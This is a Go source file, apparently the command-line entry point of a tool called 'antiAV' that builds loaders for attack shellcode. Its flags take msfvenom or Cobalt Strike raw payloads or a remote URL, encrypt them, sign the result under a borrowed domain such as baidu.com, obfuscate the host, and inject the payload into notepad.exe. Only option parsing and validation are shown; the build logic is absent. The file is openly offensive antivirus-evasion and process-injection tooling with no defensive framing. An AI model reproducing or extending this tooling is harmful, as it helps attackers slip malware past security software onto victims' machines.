package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/sirupsen/logrus"
)

var (
	antiAV = config{
		loader: "normal",
	}
)

func main() {
	initialize()
	antiAV.build()
}

func initialize() {
	flag.StringVar(&antiAV.loader, "l", "sc", "loader: binary")
	flag.StringVar(&antiAV.shellcode, "sc", "payload.e", "encrypt payload by anti-av: support 'msfvenom -f raw' OR 'cs raw' OR remote url loading")
	flag.StringVar(&antiAV.os, "os", "windows", "OS: windows,linux")
	flag.StringVar(&antiAV.domain, "domain", "baidu.com", "domain to be signed")
	flag.StringVar(&antiAV.hostObfuscator, "ho", "wwww.baidu.com", "host obfuscator")
	flag.BoolVar(&antiAV.crypt, "e", false, "payload to be encrypted")
	flag.BoolVar(&antiAV.inject, "inject", false, "inject payload to notepad.exe")
	flag.Parse()

	if err := antiAV.validate(); err != nil {
		logrus.Error("[-]", err.Error())
		os.Exit(0)
	}

	logrus.SetFormatter(&logrus.TextFormatter{
		DisableColors:          false,
		DisableTimestamp:       true,
		FullTimestamp:          false,
		DisableLevelTruncation: false,
	})

}

func (c *config) validate() error {
	switch c.loader {
	case "sc":
	default:
		return fmt.Errorf("not Support Loader: %v", c.loader)
	}
	switch c.os {
	case "windows":
	default:
		return fmt.Errorf("not Support OS: %v", c.os)
	}
	if c.domain == "" {
		logrus.Warn("[-] Disable Sign")
	}

	return nil
}
